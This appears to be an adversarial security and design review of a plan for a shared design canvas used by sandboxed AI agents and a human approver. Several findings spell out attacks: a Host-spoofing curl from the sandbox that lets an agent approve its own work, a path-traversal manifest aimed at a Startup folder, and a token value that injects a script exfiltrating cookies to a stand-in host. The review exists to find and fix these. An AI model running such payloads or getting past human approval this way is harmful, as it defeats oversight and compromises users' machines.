# Phase 5 design canvas plan — adversarial review

**Reviewer:** adversarial plan reviewer (workflow agent), 2026-09-24, on `feat/phase-5-canvas`.
**Plan under review:** `docs/superpowers/plans/2026-09-23-phase-5-design-canvas.md` (515 lines) and
its 30 parts under `2026-09-23-phase-5-design-canvas-parts/`, as of commit `5060cc3`.
**Method:** every citation marked *verified* was opened in the real tree at that commit, or in a
sibling worktree at its current HEAD (hub `c15e6f4`, phase-3 `d785477`, phase-4 `c93fa04`), by
absolute path, read-only. Anything not opened is marked *unverified*. This review compiled and ran
nothing except `sha256sum`/`hashlib` over the digest vector and a module-cache listing.

**Verdict in one line:** a strong, unusually well-evidenced plan with **2 Critical**, **12
Important** and 23 Minor defects, most of the serious ones on the security boundary between agents
and the human's surface.
**Plan quality: Needs fixes** (see Assessment).

---

## Coverage

### Owner decisions

| Decision | Covered? | Where / gap |
|---|---|---|
| OD-1 (build now, adversarial review, UI unmerged) | Yes | plan `:3-6`; task 28 step 2 and task 30 step 6 say *do not merge* |
| OD-2 (worktree = local clone) | Yes | task 22 finds the exclude file with `rev-parse --git-path` (works for a clone). **Gap:** runs host git in an agent-writable clone unhardened — Important I1 |
| OD-3 / OD-5 / OD-6 (shared, Hub, Entra) | Yes | tasks 21, 22; approvals held in memory only (`task-10.md:14-15`, `task-21.md:178`) |
| OD-8 (no PTY meaning; transcript adapter only) | Yes | G5 (`plan:262-264`); nothing reads a transcript |
| OD-9 (cockpit chords win) | Yes | G11, `task-25.md:76-89` prunes against `useKeyboardMap` |
| OD-11 rule 1 (clean room) | Yes | grep of all 30 parts for `Paperdesign|doop|Northstar|agent-plugins`: **0 matches**. `x-clone` traced to the spec's public third-party rules copy [S11] (`paper-design-cleanroom-spec.md:206-218`), renamed |
| OD-11 rule 2 (public behaviour, record URLs) | Yes | via the spec's §12; task 09 step 1 records the DTCG source or says it was blocked |
| OD-11 rule 3 (MIT/Apache/BSD/ISC, gate in CI, no tldraw) | Partly | task 04. **Gaps:** gate holes and an unstated existing MPL fact — Important I9, I10 |
| OD-11 rule 4 (own package, testable alone) | Yes | `canvas/` Go module + `canvas/editor` npm package; boundary tests (`task-05.md:309`, `task-23.md:180`) |
| OD-12 (owner items batched, unverified) | Yes | every UI part's acceptance; task 30 step 5 (seven items) |
| OD-13 (no Panacea) | Yes | plan `:154` |

### Phase 5 brief (`scope-and-risk-phase-5-design.md`, verified)

D3 option A at `:194-206` — covered by `review_mark` (task 06) and re-review (task 21). R4, R6
(script on server; frame forging edits) — deleted by construction (no script anywhere, G7). R5 —
claims and `ifRevision` (task 12). R7 — the relay channel is the credential (tasks 18–19). R8 —
snapshot captured into the Hub (task 21). R9 — one SSE stream per window (task 20). R11 (egress) —
no external URL survives the dialect; the iframe CSP is `default-src 'none'`. R12 (`$`-splice) —
no string splicing exists. R13 (dot grid) — G12 forbids it.

### The clean-room spec's v1 list (§9.1, `paper-design-cleanroom-spec.md:625-641`)

All thirteen items have a task: 1→01, 2→05–13, 3→14–17, 4→18–19, 5→24, 6→25–26, 7→09/17/26,
8→12/25/28, 9→17/28, 10→21/28, 11→22, 12→29, 13→04. The MCP surface matches §8.1–§8.3 tool for
tool (14 read + 13 write + 8 tokens/comments/export/guide = **35**, counted), with `export`'s `jsx`
split into `jsx-inline`/`jsx-tailwind` and `at` added — both improvements. Every §8.4 exclusion
(approve, bind, delete canvas, break claim, list other canvases) is absent and pinned by
`TestNoApproveTool` (`task-16.md:108`).

### The prototype (`prototype/phase-5-design.html`, 577 lines, verified)

`task-28.md:21-31` maps all seven states against the notes at `:486-524` (verified): the R7
access-approval row is deleted, the component tree is now produced, state 6 is split into
control-plane-down vs Hub-down. **Gap:** state 4's *Open rev 5 / Open rev 6* needs phase 4 to render
a past revision read-only (the prototype's own note, `:510`), which task 28 does not list as an
external dependency — Minor M14.

### Citations checked against the real tree

**Verified correct:** `go.work:1`; `azure-pipelines.yml:9-17`; `control-plane/go.mod:52` (x/net
v0.26.0, and `v0.26.0.zip` is in the module cache); `images/sandbox/Dockerfile:3-6, 7-8, 10, 17`;
`harness/argv.go:24-29, 80-125, 91-97`; `harness.go` `Request` has exactly seven fields
(`:105-113`), `ErrUnsupportedOption`, `ErrConversationID`; `api/sessions.go:339, 342, 921-936, 924,
925`; `backend/backend.go:29-38, 177-207`; `backend/dial.go:38-66`; `sandboxd/internal/server/server.go:1,
33-39, 69-90, 105-116`; `sandboxd/go.mod` (coder/websocket); `proxy/proxy.go:9`; `registry.Session`
carries `ProjectID`, `BranchID`, `Title`, `Endpoint`, `AttachToken`, `SandboxID`, `Status`;
`statepath.Dir`; `httpx.MaxBodyBytes = 1 << 20`, `CodeConflict`; `cmd/api/config.go:69-70`;
`api.go:287` (`/api/v1/` alias); `AppShell.tsx:36-43`; `heartbeat.ts` `beatDelayStyle`,
`useHeartbeat`; every token G12/G13 names exists in `desktop/src/styles/tokens.css`;
`routes_audit_test.go:32` `catalogReadOnlyRoutes`; Hub contract §3.2 grammar (`:121`), §7.6
(`:835-861`), §7.7 (`:863-915`), §7.8 (`:917-`), §9.2's five `Designs` methods (`:1293-1299`) and the
PutBlob retry (`:1337`, so HA5-1 is real); Hub `task-04.md:91-100` (seven methods, so HA5-2 is real);
ADR-H1 R5 (`:706`); phase-3 plan `:134` (3-D6) and `:330` (S3-P5.1); phase-4 plan `:169` (P4-A);
`tauri.conf.json:20-21` (`csp: null`).

**Wrong or drifted:** phase-4 plan `:410-412` (cited at plan `:188-189` for S4-P5.1–3) now holds
other text; the seams are at `:457-459` (M9). Plan `:503-505` describes `go-licenses` and
`license-checker` as pinned by task 04, which P5-P and task 04 replaced with our own program (M1).
Plan `:384` says task 02 adds the control plane's `replace`; `task-02.md:104` and G1 say task 19
does (M2). `task-18.md:27` omits `sandboxd/cmd/sandboxd/serve_other.go` (M5).

**Golden vectors, recomputed:** task 05's seven `Between` vectors hold by hand (base-62, `V`=31,
`k`=46, `F`=15). Task 08's vector 1 is 366 bytes and hashes to `d369645a…3ca376`; replacing `@5`
with `@6` gives 366 bytes and `8208d6b8…86cc9b`. Both match the plan.

---

## Strengths

1. **The sanitiser builds nodes, never strings**, and the renderer rebuilds DOM with `createElement`
   from a Go-generated allowlist, re-checking every property; a grep gate (`task-24.md:133`) allows
   exactly one HTML string. There is **no `postMessage` channel at all** — the parent reads the
   same-origin DOM of a script-less iframe — so the origin-check class of bug does not exist.
2. **Identity comes from the channel.** MCP is served only on the tunnel's per-session
   `http.Server`, identity is re-read from the registry on every request, a missing identity is a
   500 (`task-14.md:119`), and no tool can approve, bind or break a claim.
3. **The relay keeps phase 2's direction** (the control plane dials in), binds loopback only
   inside the sandbox, is payload-blind, has per-stream flow control, and pins both codecs to one
   golden file with a byte-equality test. Avoiding yamux (MPL-2.0) is correct.
4. **Unverified assumptions carry stop conditions**: x/net in the cache (`task-07.md:333-335`),
   `claude --help` for the two flags (`task-19.md:140-144`), the spike's decision table
   (`task-01.md:95-103`). The variadic-flag trap is handled twice: flags first, and `validateMCP`
   requires `--session-id` to follow.
5. **Tests are mutation-minded and include negatives**: the spike's `--negative` run, the MPL
   fixture repo, tldraw-declared-MIT, exception laundering, torn-tail vs corrupt-middle logs,
   `TestPrepare_doesNotMutate`, `TestLog_neverArguments`, `TestNothingOnDisk`.
6. **The Hub asks are genuine catches**, each verified: HA5-1 (a retried `io.Reader`), HA5-2 (five
   vs seven methods), HA5-4 (R5's "session context" has no field to live in).

---

## Issues

### Critical

#### C1. "Only a human approves" rests on a guard the plan treats as optional

- **Where:** plan `:103-107` (rule 4: approval *"only through `POST …/approvals`, which no MCP tool
  reaches"*); `task-20.md:62` (the local key *"when it has landed"*); `task-27.md:160-161` (*"until it
  lands the stream is guarded as every other route is"*); `task-21.md:206` (`TestApprove_noMCPPath`
  checks only that no MCP tool maps to the route). Writer's return: *"C3 local caller key
  (optional…)"*.
- **What is wrong:** without Hub task C3 (Hub plan tasks 37–38), the control plane's REST surface is
  guarded only by the Host check and the Origin allowlist. Both are defences against a **browser**:
  `httpx/origin.go:117-123` passes a request with **no** `Origin`, and the Host header is whatever
  the client writes. Sandboxes run on Docker's default bridge (`dockerbe/docker.go:203-204`). The
  Hub contract itself names *"a process in a sandbox that can reach the host's loopback"* as the
  threat the local key exists to stop (`hub-contract.md:1382-1397`, threat T6 at `:2065`, whose
  mitigations list *"no MCP tool approves (phase 5)"* **and** the local key).
- **Failure scenario:** an agent (or a prompt-injected dependency it runs) inside the sandbox sends
  `curl -H "Host: 127.0.0.1:8730" -X POST http://host.docker.internal:8730/v1/design/canvases/<id>/approvals -d '{"revision":12}'`.
  No Origin → allowed; Host spoofed → allowed; the route calls the Hub **as the signed-in user**.
  The agent has approved its own design, which is exactly ADR-H1 R5. The same path reaches route 5
  (edit as `human`, bypassing claims), route 8 (revert another agent), route 9 (break claims), route
  17 (forge the human's selection), route 19 (answer screenshot requests with forged PNGs after
  registering a *visible* renderer on route 20), and route 4 for **any** project's canvas —
  cross-project reads that MCP scope forbids. *Unverified by this review:* that Docker Desktop on
  this fleet forwards `host.docker.internal` to the host's loopback; the Hub contract assumes it can.
- **Why it matters:** the provenance spine's one hard rule — a person approves — becomes a
  convention an agent can ignore.
- **Fix:** make Hub C3 (tasks 37–38) a **hard** dependency of tasks 20, 21, 22 and 27, not optional.
  `designapi.New` takes the key-guard middleware and refuses to build without it. Add a negative
  test per route class (no key → 401 `local_key_required` on routes 5, 8, 9, 17, 19, 20, 21, 24).
  Add to task 30 step 1 a probe from inside the sandbox — the `curl` above — asserting 401, and
  record in the e2e report whether the host was reachable at all.

#### C2. The handoff writes files at paths taken from a shared Hub record, unvalidated

- **Where:** `task-22.md:48-53` (`Materialise`: *"fetch the manifest by its digest, verify its
  SHA-256, fetch and verify every file it lists, write them all"*); `task-21.md:73-106` (the manifest
  carries `files[].path`); Hub contract `:903` (*"What the Hub does not check … the manifest blob's
  contents are phase 5's"*).
- **What is wrong:** SHA-256 proves the bytes match the manifest; it proves nothing about the
  **paths**. The Hub is shared across a team (OD-3), and any member can write an approval with any
  manifest through the Hub API. `Materialise` never says a path must be relative, `/`-separated,
  free of `..`, drive letters, backslashes, `:` (NTFS alternate streams) or reserved names.
- **Failure scenario:** a teammate's client posts an approval whose manifest lists
  `../../../../AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/x.cmd` as a
  `text/plain; charset=utf-8` blob (an allowed Hub type, `hub-contract.md:841`). The victim clicks
  *Start a Develop session from this design*; the host control plane, running as the victim, writes
  the file outside the worktree; it runs at next sign-in.
- **Why it matters:** code execution on a colleague's machine from shared data.
- **Fix:** in `Materialise`, accept only the names `BuildSnapshot` can produce —
  `^(assets/[0-9a-f]{64}\.(png|jpg|webp|svg)|[a-z0-9-]{1,60}(\.tailwind)?\.(html|png|jsx)|tokens\.(css|json)|tree\.json)$` —
  check `filepath.Rel(tmp, filepath.Join(tmp, p))` never starts with `..`, cap the file count
  (500) and total bytes, and require the manifest's `canvasId`/`designKey` to equal the approval's.
  Tests: `../x`, `/x`, `C:\x`, `a\..\..\x`, `assets/../../x`, `CON.html`, `x.html:s` → `ErrTampered`
  (or a new `ErrUnsafePath`), nothing written.

### Important

#### I1. The handoff trusts an agent-writable clone: unhardened host git, symlinks, a redirectable exclude file

- **Where:** `task-22.md:80-86` (`git -C <worktree> ls-files -- .panacea`, `git -C <worktree>
  rev-parse --git-path info/exclude`, then append); `task-22.md:48-53` (writes through `FS`).
- **What is wrong:** phase 3 establishes that the clone's `.git/config` and every file in it are
  written by the agent, and that *"unhardened, each of those calls is code execution on the Windows
  host"* (`phase-3 …/task-02.md:320-345`, its §HGH command-scope prefix). Task 22 runs bare `git -C`.
  `--git-path` also follows a `.git` **gitfile** the agent can plant (`gitdir: /elsewhere`), so the
  control plane appends to a file of the agent's choosing. And a `.panacea` symlink planted by the
  agent redirects `Materialise`'s writes outside the worktree on a Linux or macOS host
  (*unverified* on Windows, where a container-made symlink may not resolve).
- **Fix:** run both git calls through phase 3's hardened `Exec` (name it as a dependency). Compute
  the exclude path as `<worktree>/.git/info/exclude` only after `Lstat` shows `.git` is a real
  directory; otherwise refuse. `Lstat` every component of `.panacea/design/<canvasId>@<rev>` and
  refuse symlinks and reparse points. Tests: a gitfile `.git`, a symlinked `.panacea`, a clone
  whose config sets `core.fsmonitor=<marker script>` → no marker, nothing written outside.

#### I2. Token values skip the value checks, so a script or a remote URL reaches the export

- **Where:** `task-07.md:125-130` (the global refusals apply to **declarations**);
  `task-05.md:119` and `task-07.md:289` (`TokenValue` only "checks for Type"); `task-07.md:328`
  (`TestTokenValue` has only type positives/negatives); `task-08.md:56` (`ExportHTML` writes tokens
  into a `<style>` element); `task-09.md:125-130` (`tokens.css`); `task-23.md:161-165` (the
  renderer's re-check covers styles, not tokens); `task-24.md:45` (tokens via `setProperty`).
- **Failure scenario:** a prompt-injected agent calls `set_tokens` with `brand` =
  `red}</style><script>fetch('https://x.example/?'+document.cookie)</script><style>` (type
  `font-family`, whose rule is effectively "any"), or `url(https://tracker.example/p.png)`. The
  canvas shows nothing wrong (`setProperty` ignores or the iframe CSP blocks it), the human approves,
  and the exported `<slug>.html` in the bundle runs a script, or fetches a remote URL, the moment a
  person opens it in a browser. `TestExportHTML_standalone` (`task-08.md:145`) would catch it only
  with an adversarial token in its fixture, which the plan does not list.
- **Fix:** `TokenValue` applies `CheckDeclaration`'s global refusals plus `;`, and a `url()` must be
  an `asset:` ref; `allowlist.ts` re-checks token values before `setProperty`. Add the two values
  above to `TestTokenValue` (refused) and to the export test's fixture.

#### I3. The CORS preflight does not allow `PUT`, so two routes fail from the real desktop

- **Where:** `task-20.md:43` (route 11, `PUT …/assets/{sha}`) and `:49` (route 17, `PUT
  …/selection`); `control-plane/internal/httpx/origin.go:169-170` (`corsMethods = "GET, POST, PATCH,
  DELETE, OPTIONS"`) and `:231-236` (the preflight answer).
- **Failure scenario:** every Go and vitest test passes (httptest and an injected `fetch` enforce no
  CORS), then in the Tauri webview the preflight for route 11 omits `PUT` and the browser blocks the
  request: image paste and upload never work, and `get_selection` is always empty because the
  selection is never stored. The phase 2 UI contract recorded this exact trap once already
  (`2026-09-18-phase-2-ui-contract.md` §10.1: *"will not be noticed until the first REST call"*).
- **Fix:** either make both routes `POST`, or amend `corsMethods` (a declared amendment task 30
  records). Add an `httpx` test that the preflight's `Allow-Methods` covers every method the route
  recorder registers, so a new verb cannot drift again.

#### I4. The hidden renderer stops when the window is hidden, which is the product's normal state

- **Where:** P5-Q (`plan:212`), G10 (`plan:281-283`: *"the render queue is driven by
  `requestAnimationFrame` only"*), `task-24.md:65-69` (*"ONE requestAnimationFrame per store
  version"*), `task-24.md:111-117` (the responder uses the live views at head).
- **What is wrong:** Chromium does not run `requestAnimationFrame` callbacks in a hidden document.
  `AGENTIC-UX.md` §3 step 2 makes *LEAVE — the human is gone* the core loop, so a minimised cockpit
  is the common case while agents design.
- **Failure scenario:** the user minimises the cockpit; an agent calls `get_screenshot`; the hidden
  renderer's views never sync the agent's last write (the patch waits for a frame that never
  comes), so the PNG shows the stale artboard, or capture waits and the request times out as
  `renderer-unavailable` though the desktop is running. *Unverified:* whether wry/WebView2 marks a
  minimised window hidden; Chromium's hidden-page behaviour is standard.
- **Fix:** schedule patches with `requestAnimationFrame` while `document.visibilityState ===
  "visible"` and with `queueMicrotask` otherwise (no interval, so G10 holds); the responder calls
  `view.sync()` before it measures or captures. Add spike check S11 (minimise Edge, send a render
  request, record the result) and a responder test with `visibilityState` stubbed `"hidden"`.

#### I5. Approval captures every artboard at 2× inside the agents' 15-second render budget

- **Where:** `task-21.md:167-169` (step 4: *"2× screenshots of every artboard at that revision
  (`authority.Render`, 50 per request)"*); `task-13.md:89-93` (`RenderTimeout = 15 * time.Second`,
  `MaxRenderNodes = 50`); `task-01.md:64` (S8 records fidelity, not time).
- **Failure scenario:** a twelve-screen settings flow; the approval sends one request for twelve
  2× PNGs. Each DOM-to-image capture inlines fonts and images and encodes a PNG in the webview's
  main thread; twelve of them plausibly exceed 15 s (*unverified* — nobody has measured it), and the
  human gets `409 renderer_unavailable`, *"the renderer failed"*, on the one action the spine
  depends on. The same budget serves an agent's one-node screenshot, so the constant cannot simply
  grow.
- **Fix:** approval renders **one artboard per request** with its own deadline (say 30 s), shows
  progress in the approval toast, and fails naming the artboard that failed. Add capture time per
  artboard at 1× and 2× to task 01's S8 matrix, so the deadline is a measured number.

#### I6. Task 20's declared dependencies are wrong, and the waves run it too early

- **Where:** `task-20.md:3` (*"Depends on: 11, 12, 13"*); `task-20.md:192-197` (the wiring calls
  `mcp.NewServer` (task 14), `mcp.Instructions` (17), `mcp.RegisterAll` (15), and
  `mcprelay.NewSupervisor` (19), and passes an `Approvals` port that task 21 creates); plan `:422`
  (wave 4 runs 20 beside 15 and 16, before 17); plan `:425-430` (lane E is "20–22").
- **Failure scenario:** a lane-E worktree agent starts task 20 when 11–13 land, as the plan says it
  may; `cmd/api/main.go` does not compile because `RegisterAll`, `Instructions` and
  `NewSupervisor` do not exist yet. It either stubs them (drift) or blocks, and the user's
  "as much as you can in parallel" plan stalls on a dependency nobody declared.
- **Fix:** split task 20 into **20a** (`designapi` routes, `events`, codes, audit — depends on
  11–13) and **20b** (config and `main.go` wiring — depends on 17, 19 and 20a, with a stub
  `Approvals` returning "none" until 21). Update the waves, the critical path and the lanes.

#### I7. A canvas binding does not follow a branch rename, and outlives a branch delete

- **Where:** `task-10.md:42-49` (`Binding` keyed by local `ProjectID`, `BranchID`); P5-L
  (`plan:207`); `control-plane/internal/project/project.go:118-121` (`BranchID` is a pure function
  of the project id and the branch **name**); phase 3's plan adds branch rename, a rename map
  (`GET /v1/projects/{projectId}/renames`, *old branch id → new branch id*) and branch delete.
- **Failure scenario:** the user renames `feature/login` to `feature/sign-in` (phase 3 allows it for
  a branch with no worktrees); the renamed branch has a new `BranchID`, so the Design lens shows
  state 1, *no canvas*, while the approved design and its Hub approvals sit on a canvas no branch
  shows — a broken thread, which `CLAUDE.md` calls wrong whatever else is good. Conversely,
  deleting `feature/login` and later creating a new `feature/login` derives the same id, so the new
  branch silently inherits the old canvas and its approvals.
- **Fix:** add seam S5-P3.2: `designapi` reads phase 3's rename map and rebinds (one line in
  `bindings.json`, temp file + rename); a branch delete archives the binding so a new branch of the
  same name gets a new canvas. Tests for both.

#### I8. SVG nodes render as nothing without `xmlns`, and their ids collide inside an artboard

- **Where:** `task-07.md:265-280` (`SanitiseSVG` keeps `id` and `url(#id)` verbatim and emits
  `xmlns` only if the input had it); `task-24.md:51-53` (`DOMParser("image/svg+xml")`, then
  `importNode`); `task-24.md:136` (`svgWalk` asserts only that a `d` attribute survives).
- **Failure scenario 1:** an agent writes `<svg viewBox="0 0 24 24"><path d="…"/></svg>` — valid
  inline SVG in HTML, no `xmlns`. The canonical markup has no `xmlns`; the XML parser puts the
  elements in **no namespace**; imported into the artboard they are unknown elements and draw
  nothing. `svgWalk` still passes because it checks for `d`, not for `namespaceURI`.
- **Failure scenario 2:** two icons in one artboard each define `<linearGradient id="paint0_linear">`
  (the Figma export default). Both live in one iframe document, so the second icon's
  `fill="url(#paint0_linear)"` resolves to the first icon's gradient — wrong on the canvas, in the
  PNG and in the exported HTML.
- **Fix:** `SanitiseSVG` always writes the root `xmlns="http://www.w3.org/2000/svg"`, emits
  well-formed XML (escaped `&`, `<`, `"`), and prefixes every kept `id` with the node id, rewriting
  `url(#…)` to match. Tests assert `namespaceURI` in `svgWalk` and distinct ids across two SVG
  nodes.

#### I9. The licence gate has four ways to pass something it should fail

- **Where:** `task-04.md:44-47` (`DeniedNames`, `FirstParty` as name strings), `:119-130`
  (`Classify`), `:146-151` (`NpmDeps`), `:185` (`TestEvaluate_devDepReportsOnly`).
- **What is wrong, each with its failure:**
  1. **A runtime import of a devDependency is bundled but only reported.** Vite bundles whatever
     `src/` imports, whatever `package.json` calls it. An implementer who adds `html-to-image` to
     `canvas/editor`'s `devDependencies` (the file already mirrors the desktop's dev list) ships it
     unchecked. `canvas/editor` ships **source** (`task-03.md:57-60`), so every import it makes ships.
  2. **First party is matched by name.** `"desktop"` and `"@panacea-app/"` would exempt a registry
     package named `desktop-notify` or `@panacea-app/x` if matching is by prefix, as `"@tldraw/"` in
     the deny list implies. The contract does not say which.
  3. **A Go module with no licence file** is not covered by any rule or test.
  4. **`npm ls --json` carries no path**, so how an entry maps to its `package.json` (to read
     `license`) is undefined; the natural guess, `node_modules/<name>`, is wrong for nested copies.
- **Fix:** exempt first party structurally — an `npm ls` link node (`resolved: "file:…"`) and a Go
  `.Module.Main` or local `replace` — never by name. Fail a Go module with no licence file. Read
  `npm ls --all --json --long` (which carries `path`) or `npm query "*"`. Enforce every dependency
  of `canvas/editor` (it ships source) and every devDependency that a file under `desktop/src`
  imports. One test per hole.

#### I10. OQ-P5-2 asks the owner not to scan Cargo without telling them what Cargo holds

- **Where:** plan `:471` (OQ-P5-2) and `task-04.md:224-225` (*"Tauri's own crate tree predates
  OD-11 and is outside this phase"*).
- **What is wrong:** `desktop/src-tauri/Cargo.lock` already lists four MPL-2.0 crates:
  `cssparser 0.36.0` (`:587`), `selectors 0.36.1` (`:2923`), `dtoa-short 0.3.5` (`:850`) and
  `option-ext 0.2.0` (`:2382`) (verified present in the lock; *unverified* which link into the
  release binary). The canvas ships inside that binary. The owner's rule says *"MIT, Apache-2.0,
  BSD or ISC only"*; the recommendation hides a known exception instead of putting it to them.
- **Fix:** have the gate **report** Cargo (`cargo metadata --offline`, report-only, like dev
  dependencies), list the four crates in the first-run report, and rewrite OQ-P5-2 to state them
  so the owner decides with the fact (MPL-2.0 is file-level copyleft; an exception entry may well
  be the answer).

#### I11. A token change restyles other agents' claimed artboards with no notice

- **Where:** plan goal 3 (`:40-43`, *"Many writers never silently collide"*); `task-12.md:101-106`
  (a notice is sent only for a change *"that touched an artboard the caller holds"*); `task-12.md:85`
  and `:203` (tokens carry no revision and no precondition); `task-17.md:48` (`set_tokens`).
- **Failure scenario:** agent S holds *Settings*, agent T holds *Billing*; both use `var(--brand)`.
  T calls `set_tokens` to change `brand`. S's artboard changes colour; S's next result carries no
  notice (no node in S's artboard changed), so S keeps designing against a palette it did not
  choose and cannot see changed. That is a silent collision.
- **Fix:** a token change produces a notice for every session holding an artboard whose subtree
  uses the token (`serialize.TokensUsed`), naming the token and the author; add
  `TestNotices_tokenChange`. Optionally let `set_tokens` take `ifRevision` against a per-token
  revision.

#### I12. Agents cannot realistically place a raster image

- **Where:** `task-16.md:56-58` (`upload_asset` takes base64 in the tool's arguments, up to
  13,981,016 characters); spec `:587` (*"Paper reads local paths"*).
- **What is wrong:** the base64 must be written by the model as tool-call output. A 300 KB logo is
  about 400,000 characters — far beyond a model's output budget for one call — so the
  *code-to-design* flow (put the repository's logo on the canvas) fails for anything but tiny
  images, and the guide does not say what to do instead.
- **Fix (cheap, already possible):** the MCP endpoint is reachable by **any** process in the
  sandbox and is stateless, with identity from the channel, so a shell command can upload a file as
  the session. Ship a short helper in the image (`/usr/local/bin/canvas-upload <file>`, a Node
  script POSTing `upload_asset` to `127.0.0.1:8731/mcp`; the image has Node, `Dockerfile:10`), teach
  it in `canvas-rules`, and state the corollary in the threat model: every sandbox process can act
  on the canvas as its session, within that session's scope.

